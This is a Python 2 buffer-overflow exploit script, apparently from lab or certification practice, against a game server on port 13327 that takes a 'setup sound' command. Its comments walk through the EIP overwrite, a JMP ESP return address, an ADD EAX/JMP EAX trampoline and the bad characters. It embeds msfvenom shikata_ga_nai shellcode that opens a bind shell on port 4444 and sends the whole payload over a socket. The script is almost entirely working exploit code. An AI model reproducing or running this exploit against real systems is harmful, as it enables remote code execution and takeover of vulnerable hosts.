#!/usr/bin/python
import socket
#host="127.0.0.1"
#crash="\x41"*4379
#crash = "\x41"*4368 + "\x42"*4 + "C"*(4379-4-4368)
#buffer="\x11(setup sound " + crash + "\x90\x00#"
#s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#print "[*]Sending Evil Buffer"
#s.connect((host,13327))
#s.send(buffer)
#data=s.recv(1024)
#print data
#s.close()
#print "[*]Payload sent"

# We find out our buffer of A's ended up in EAX register
# 0xb7beaa0e right click main window and go to expression at this address in EAX register
# Cannot increase buffer length of EAX register
# So we first jump to ESP and then have a JMP EAX register with offset of +12 bytes to skip the undesirable JMP instructions that can ruin our shellcode
# The difference is that we are now using our capital A's 0x41's as our buffer rather than our C's which cannot be expanded

#83C00C ADD OFFSET 12 BYTES TO EAX REGISTER
#FFE0 JMP TO EAX REGISTER

# bad bytes 0x00 0x0a 0x0d 0x20

# msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b '\x00\x0a\x0d\x20' --platform linux --arch x86 -e x86/shikata_ga_nai
shellcode = ("\xba\x40\x2e\x9b\x7f\xda\xc8\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x14\x31\x57\x14\x03\x57\x14\x83\xef\xfc\xa2\xdb\xaa\xa4\xd5"
"\xc7\x9e\x19\x4a\x62\x23\x17\x8d\xc2\x45\xea\xcd\x78\xd4\xa6"
"\xa5\x7c\xe8\x57\x69\xeb\xf8\x06\xc1\x62\x19\xc2\x87\x2c\x17"
"\x93\xce\x8c\xa3\x27\xd4\xbe\xca\x8a\x54\xfd\xa2\x73\x99\x82"
"\x50\x22\x4b\xbc\x0e\x18\x0b\x8b\xd7\x5a\x63\x23\x07\xe8\x1b"
"\x53\x78\x6c\xb2\xcd\x0f\x93\x14\x41\x99\xb5\x24\x6e\x54\xb5")

ADD_EAX_12="\x83\xC0\x0C"
JMP_EAX="\xFF\xE0"
len_instructions = 5
len_shellcode = 105
#0x08134597, memory address for JMP ESP instruction
JMP_ESP="\x97\x45\x13\x08" # Little Endian x86, must be REVERSED! This is overwriting EIP register
ret = JMP_ESP
# The ESP register has limited space so we simply send the opcode command to JMP to our A's
# Check that these instructions are not the bad characters identified
host = "127.0.0.1"
crash = shellcode + "\x41"*(4368-len_shellcode) + JMP_ESP + ADD_EAX_12 + JMP_EAX + "\x90"*(4379-4-4368-len_instructions)
#crash = shellcode +  "\x41" * (4368-105) + ret + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"
buffer = "\x11(setup sound " + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print "[*]Sending evil buffer"
s.connect((host,13327))
s.send(buffer)
data = s.recv(1024)
print data
s.close()
print "[*]Payload sent"

